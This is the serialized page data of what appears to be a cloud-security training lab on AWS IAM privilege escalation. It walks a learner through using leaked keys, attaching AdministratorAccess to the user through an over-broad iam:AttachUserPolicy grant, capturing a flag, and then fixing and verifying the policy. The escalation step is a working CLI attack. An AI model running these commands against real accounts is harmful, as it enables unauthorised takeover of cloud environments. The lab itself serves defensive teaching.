"$\",\"div\",null,{\"className\":\"lg:col-span-2\",\"children\":[\"$\",\"article\",null,{\"className\":\"lab-md rounded-2xl border border-line bg-surface p-6 sm:p-7\",\"children\":[[\"$\",\"h1\",\"h1-0\",{\"children\":\"IAM Privilege Escalation\"}],\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":[[\"$\",\"strong\",\"strong-0\",{\"children\":\"Level:\"}],\" Intermediate · \",[\"$\",\"strong\",\"strong-1\",{\"children\":\"~75 min\"}],\" · Region: us-east-1\"]}],\"\\n\",[\"$\",\"blockquote\",\"blockquote-0\",{\"children\":[\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":[\"You have admin access to this throwaway account via the console/CloudShell — that's\\nyour \",[\"$\",\"em\",\"em-0\",{\"children\":\"defender\"}],\" seat. The lab also hands you a \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"separate, low-privileged identity\"}],\"\\n(leaked keys) to attack with. Everything is auto-destroyed when your session ends.\"]}],\"\\n\"]}],\"\\n\",[\"$\",\"h2\",\"h2-0\",{\"children\":\"Scenario\"}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"children\":[\"A CI/CD user called \",[\"$\",\"strong\",\"strong-0\",{\"children\":[\"$\",\"code\",\"code-0\",{\"children\":\"pipeline-deployer\"}]}],\" was meant to have a tight, limited policy.\\nIts access keys leaked. On paper it can barely do anything — but the policy hides a\\nflaw that lets it promote itself to \",[\"$\",\"strong\",\"strong-1\",{\"children\":\"full administrator\"}],\". Your job: \",[\"$\",\"strong\",\"strong-2\",{\"children\":\"prove the\\nescalation, then close it\"}],\" without breaking the user's legitimate function.\"]}],\"\\n\",[\"$\",\"p\",\"p-2\",{\"children\":\"The Session Engine gives you the leaked keys:\"}],\"\\n\",[\"$\",\"table\",\"table-0\",{\"children\":[[\"$\",\"thead\",\"thead-0\",{\"children\":[\"$\",\"tr\",\"tr-0\",{\"children\":[[\"$\",\"th\",\"th-0\",{\"children\":\"Output\"}],[\"$\",\"th\",\"th-1\",{\"children\":\"Use\"}]]}]}],[\"$\",\"tbody\",\"tbody-0\",{\"children\":[[\"$\",\"tr\",\"tr-0\",{\"children\":[[\"$\",\"td\",\"td-0\",{\"children\":[[\"$\",\"code\",\"code-0\",{\"children\":\"AttackerAccessKeyId\"}],\" / \",[\"$\",\"code\",\"code-1\",{\"children\":\"AttackerSecretAccessKey\"}]]}],[\"$\",\"td\",\"td-1\",{\"children\":[\"the leaked \",[\"$\",\"code\",\"code-0\",{\"children\":\"pipeline-deployer\"}],\" creds\"]}]]}],[\"$\",\"tr\",\"tr-1\",{\"children\":[[\"$\",\"td\",\"td-0\",{\"children\":[\"$\",\"code\",\"code-0\",{\"children\":\"TargetUserName\"}]}],[\"$\",\"td\",\"td-1\",{\"children\":[\"$\",\"code\",\"code-0\",{\"children\":\"pipeline-deployer\"}]}]]}],[\"$\",\"tr\",\"tr-2\",{\"children\":[[\"$\",\"td\",\"td-0\",{\"children\":[\"$\",\"code\",\"code-0\",{\"children\":\"VulnerablePolicyArn\"}]}],[\"$\",\"td\",\"td-1\",{\"children\":[[\"$\",\"code\",\"code-0\",{\"children\":\"LabDeployerPolicy\"}],\" (the policy to fix)\"]}]]}],[\"$\",\"tr\",\"tr-3\",{\"children\":[[\"$\",\"td\",\"td-0\",{\"children\":[\"$\",\"code\",\"code-0\",{\"children\":\"FlagParameterName\"}]}],[\"$\",\"td\",\"td-1\",{\"children\":[[\"$\",\"code\",\"code-0\",{\"children\":\"/shieldsync/lab/flag\"}],\" (read it once you're admin)\"]}]]}]]}]]}],\"\\n\",[\"$\",\"h2\",\"h2-1\",{\"children\":\"Your mission (the grader checks these)\"}],\"\\n\",[\"$\",\"ol\",\"ol-0\",{\"children\":[\"\\n\",[\"$\",\"li\",\"li-0\",{\"children\":[[\"$\",\"strong\",\"strong-0\",{\"children\":\"Admin detached\"}],\" — \",[\"$\",\"code\",\"code-0\",{\"children\":\"pipeline-deployer\"}],\" has no AdministratorAccess (managed or inline).\"]}],\"\\n\",[\"$\",\"li\",\"li-1\",{\"children\":[[\"$\",\"strong\",\"strong-0\",{\"children\":\"Primitive removed\"}],\" — \",[\"$\",\"code\",\"code-0\",{\"children\":\"LabDeployerPolicy\"}],\" no longer grants \",[\"$\",\"code\",\"code-1\",{\"children\":\"iam:AttachUserPolicy\"}],\" (or other IAM-write) on \",[\"$\",\"code\",\"code-2\",{\"children\":\"*\"}],\".\"]}],\"\\n\",[\"$\",\"li\",\"li-2\",{\"children\":[[\"$\",\"strong\",\"strong-0\",{\"children\":\"Still works\"}],\" — the user keeps its legitimate read permissions.\"]}],\"\\n\"]}],\"\\n\",\"$L12\",\"\\n\",\"$L13\",\"\\n\",\"$L14\",\"\\n\",\"$L15\",\"\\n\",\"$L16\",\"\\n\",\"$L17\",\"\\n\",\"$L18\",\"\\n\",\"$L19\",\"\\n\",\"$L1a\",\"\\n\",\"$L1b\",\"\\n\",\"$L1c\",\"\\n\",\"$L1d\",\"\\n\",\"$L1e\",\"\\n\",\"$L1f\",\"\\n\",\"$L20\",\"\\n\",\"$L21\",\"\\n\",\"$L22\",\"\\n\",\"$L23\",\"\\n\",\"$L24\",\"\\n\",\"$L25\",\"\\n\",\"$L26\",\"\\n\",\"$L27\",\"\\n\",\"$L28\",\"\\n\",\"$L29\"]}]}],\"$L2a\"]}]]}]\n2b:I[25844,[\"/_next/static/chunks/1k7z9_rdqaoj6.js\",\"/_next/static/chunks/14mrh2-p_w84d.js\",\"/_next/static/chunks/3-kvj8gfht59g.js\"],\"LabPanel\"]\n12:[\"$\",\"hr\",\"hr-0\",{}]\n13:[\"$\",\"h2\",\"h2-2\",{\"children\":\"Setup — become the attacker\"}]\n14:[\"$\",\"p\",\"p-3\",{\"children\":\"Configure a CLI profile from the leaked keys (do this in CloudShell):\"}]\n15:[\"$\",\"pre\",\"pre-0\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"language-bash\",\"children\":\"aws configure --profile attacker\\n#   AWS Access Key ID     -> <AttackerAccessKeyId>\\n#   AWS Secret Access Key -> <AttackerSecretAccessKey>\\n#   region                -> us-east-1\\n\\naws sts get-caller-identity --profile attacker\\n# -> .../user/lab/pipeline-deployer\\n\"}]}]\n16:[\"$\",\"h2\",\"h2-3\",{\"children\":\"Step 1 — Recon: what can this identity do?\"}]\n17:[\"$\",\"pre\",\"pre-1\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"language-bash\",\"children\":\"aws iam list-attached-user-policies --user-name pipeline-deployer --profile attacker\\n\\n# Read the policy itself - find the default version, then dump it\\naws iam get-policy --policy-arn <VulnerablePolicyArn> --profile attacker\\naws iam get-policy-version --policy-arn <VulnerablePolicyArn> \\\\\\n  --version-id v1 --profile attacker\\n\"}]}]\n18:[\"$\",\"p\",\"p-4\",{\"children\":[\"Read every \",[\"$\",\"code\",\"code-0\",{\"children\":\"Action\"}],\". The \",[\"$\",\"code\",\"code-1\",{\"children\":\"LooksLikeANormalDeployer\"}],\" statement is harmless reads —\\nbut the \",[\"$\",\"strong\",\"strong-0\",{\"children\":[\"$\",\"code\",\"code-0\",{\"children\":\"BuildHelpers\"}]}],\" statement grants \",[\"$\",\"code\",\"code-2\",{\"children\":\"iam:AttachUserPolicy\"}],\" on \",[\"$\",\"code\",\"code-3\",{\"children\":\"Resource: \\\"*\\\"\"}],\".\"]}]\n19:[\"$\",\"h2\",\"h2-4\",{\"children\":\"Step 2 — Why that one line is game over\"}]\n1a:[\"$\",\"p\",\"p-5\",{\"children\":[[\"$\",\"code\",\"code-0\",{\"children\":\"iam:AttachUserPolicy\"}],\" lets an identity attach \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"any\"}],\" managed policy to a user —\\nincluding itself, and including AWS's \",[\"$\",\"code\",\"code-1\",{\"children\":\"AdministratorAccess\"}],\". A \\\"limited\\\" user that\\ncan call it is, in practice, an administrator.\"]}]\n1b:[\"$\",\"h2\",\"h2-5\",{\"children\":\"Step 3 — Exploit: escalate and capture the flag\"}]\n1c:[\"$\",\"pre\",\"pre-2\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"language-bash\",\"children\":\"# Confirm you can't read the flag yet (no ssm perms)\\naws ssm get-parameter --name /shieldsync/lab/flag --profile attacker\\n# -> AccessDenied\\n\\n# Escalate: attach AdministratorAccess to yourself\\naws iam attach-user-policy --user-name pipeline-deployer \\\\\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile attacker\\n\\n# You are now admin - read the flag\\naws ssm get-parameter --name /shieldsync/lab/flag --profile attacker --query Parameter.Value --output text\\n# -> SHIELDSYNC{priv-esc-via-iam-AttachUserPolicy}\\n\"}]}]\n1d:[\"$\",\"p\",\"p-6\",{\"children\":\"That flag is your proof the path is real. Now shut it.\"}]\n1e:[\"$\",\"h2\",\"h2-6\",{\"children\":\"Step 4 — Remediate (use your admin console/CloudShell, NOT the attacker profile)\"}]\n1f:[\"$\",\"p\",\"p-7\",{\"children\":[\"Drop the \",[\"$\",\"code\",\"code-0\",{\"children\":\"--profile attacker\"}],\" from here on — remediate as your own admin identity.\"]}]\n20:[\"$\",\"pre\",\"pre-3\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"language-bash\",\"children\":\"# 1) Detach the admin you just attached\\naws iam detach-user-policy --user-name pipeline-deployer \\\\\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\\n\\n# 2) Fix the policy: create a new version WITHOUT the BuildHelpers statement,\\n#    and make it the default. Save the cleaned doc as fixed-policy.json first.\\naws iam create-policy-version --policy-arn <VulnerablePolicyArn> \\\\\\n  --policy-document file://fixed-policy.json --set-as-default\\n\"}]}]\n21:[\"$\",\"p\",\"p-8\",{\"children\":[[\"$\",\"code\",\"code-0\",{\"children\":\"fixed-policy.json\"}],\" (the read statement only — escalation primitive gone):\"]}]\n22:[\"$\",\"pre\",\"pre-4\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"language-json\",\"children\":\"{ \\\"Version\\\":\\\"2012-10-17\\\",\\\"Statement\\\":[\\n  { \\\"Sid\\\":\\\"LooksLikeANormalDeployer\\\",\\\"Effect\\\":\\\"Allow\\\",\\n    \\\"Action\\\":[\\\"s3:ListAllMyBuckets\\\",\\\"s3:GetObject\\\",\\\"s3:ListBucket\\\",\\n              \\\"cloudwatch:GetMetricData\\\",\\\"logs:DescribeLogGroups\\\",\\\"logs:GetLogEvents\\\"],\\n    \\\"Resource\\\":\\\"*\\\" } ]}\\n\"}]}]\n23:[\"$\",\"blockquote\",\"blockquote-1\",{\"children\":[\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":[\"IAM managed policies keep max 5 versions. If \",[\"$\",\"code\",\"code-0\",{\"children\":\"create-policy-version\"}],\" complains,\\ndelete the old non-default version with \",[\"$\",\"code\",\"code-1\",{\"children\":\"aws iam delete-policy-version\"}],\".\"]}],\"\\n\"]}]\n24:[\"$\",\"h2\",\"h2-7\",{\"children\":\"Step 5 — Verify the hole is closed\"}]\n25:[\"$\",\"pre\",\"pre-5\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"language-bash\",\"children\":\"# No admin attached\\naws iam list-attached-user-policies --user-name pipeline-deployer\\n\\n# Prove the user can no longer escalate, but can still do its job\\naws iam simulate-principal-policy \\\\\\n  --policy-source-arn arn:aws:iam::<acct>:user/lab/pipeline-deployer \\\\\\n  --action-names iam:AttachUserPolicy s3:GetObject\\n# -> iam:AttachUserPolicy = implicitDeny,  s3:GetObject = allowed\\n\"}]}]\n26:[\"$\",\"h2\",\"h2-8\",{\"children\":\"Defender's takeaway\"}]\n27:[\"$\",\"p\",\"p-9\",{\"children\":[[\"$\",\"code\",\"code-0\",{\"children\":\"iam:AttachUserPolicy\"}],\", \",[\"$\",\"code\",\"code-1\",{\"children\":\"iam:PutUserPolicy\"}],\", \",[\"$\",\"code\",\"code-2\",{\"children\":\"iam:CreatePolicyVersion\"}],\",\\n\",[\"$\",\"code\",\"code-3\",{\"children\":\"iam:SetDefaultPolicyVersion\"}],\", and \",[\"$\",\"code\",\"code-4\",{\"children\":\"iam:PassRole\"}],\" (with a compute service) are all\\n\",[\"$\",\"strong\",\"strong-0\",{\"children\":\"privilege-escalation primitives\"}],\". Granting any of them on \",[\"$\",\"code\",\"code-5\",{\"children\":\"Resource: \\\"*\\\"\"}],\" quietly\\nmakes a \\\"limited\\\" identity an admin. Scope IAM-write actions to specific resources,\\nor don't grant them at all — and use \",[\"$\",\"code\",\"code-6\",{\"children\":\"simulate-principal-policy\"}],\" in CI to catch it.\"]}]\n28:[\"$\",\"h2\",\"h2-9\",{\"children\":\"Cleanup\"}]\n29:[\"$\",\"p\",\"p-10\",{\"children\":[\"Nothing to do — the account is wiped (\",[\"$\",\"code\",\"code-0\",{\"children\":\"aws-nuke\"}],\") and recycled when your session ends.\"]}]\n2a:[\"$\",\"div\",null,{\"className\":\"lg:col-span-1\",\"children\":[\"$\",\"div\",null,{\"className\":\"lg:sticky lg:top-6\",\"children\":[[\"$\",\"$L2b\",null,{\"slug\":\"iam-privilege-escalation\",\"objectives\":[{\"id\":\"admin-detached\",\"description\":\"AdministratorAccess (or any admin-equivalent managed/inline policy) is no longer attached to pipeline-deployer.\"},{\"id\":\"escalation-primitive-removed\",\"description\":\"The LabDeployerPolicy default version no longer grants iam:AttachUserPolicy (or other IAM write actions) on Resource '*'.\"},{\"id\":\"deployer-still-works\",\"description\":\"The user keeps its legitimate read permissions (it shouldn't be lobotomised to nothing).\"}],\"ready\":true}],[\"$\",\"div\",null,{\"className\":\"mt-3 flex flex-wrap gap-1.5\",\"children\":[[\"$\",\"span\",\"IAM\",{\"className\":\"rounded-md border border-line px-2 py-0.5 font-mono text-xs text-muted\",\"children\":\"IAM\"}],[\"$\",\"span\",\"Privilege Escalation\",{\"className\":\"rounded-md border border-line px-2 py-0.5 font-mono text-xs text-muted\",\"children\":\"Privilege Escalation\"}],[\"$\",\"span\",\"Least Privilege\",{\"className\":\"rounded-md border border-line px-2 py-0.5 font-mono text-xs text-muted\",\"children\":\"Least Privilege\"}]]}]]}]}]\nc:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n9:null\ne:[[\"$\",\"title\",\"0\",{\"children\":\"IAM privilege escalation · ShieldSync Labs\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"Hands-on AWS cloud-security labs in real, isolated AWS accounts.\"}],[\"$\",\"meta\",\"2\",{\"name\":\"robots\",\"content\":\"noindex, nofollow\"}]]\n","/labs/$d$slug/__PAGE__":"1:\"$Sreact.fragment\"\n2:I[22016,[\"/_next/static/chunks/1k7z9_rdqaoj6.js\",\"/_next/static/chunks/14mrh2-p_w84d.js\",\"/_next/static/chunks/3-kvj8gfht59g.js\"],\"\"]\n1e:I[25844,[\"/_next/static/chunks/1k7z9_rdqaoj6.js\",\"/_next/static/chunks/14mrh2-p_w84d.js\",\"/_next/static/chunks/3-kvj8gfht59g.js\"],\"LabPanel\"]\n1f:I[97367,[\"/_next/static/chunks/1k7z9_rdqaoj6.js\",\"/_next/static/chunks/14mrh2-p_w84d.js\"],\"OutletBoundary\"]\n20:\"$Sreact.suspense\"\n0:{\"rsc\":[\"$\",\"$1\",\"c\",{\"children\":[[\"$\",\"div\",null,{\"className\":\"mx-auto max-w-6xl px-5 py-8\",\"children\":[[\"$\",\"$L2\",null,{\"href\":\"/\",\"className\":\"text-sm font-semibold text-muted hover:text-ink\",\"children\":\"← All labs\"}],[\"$\",\"div\",null,{\"className\":\"mt-4 f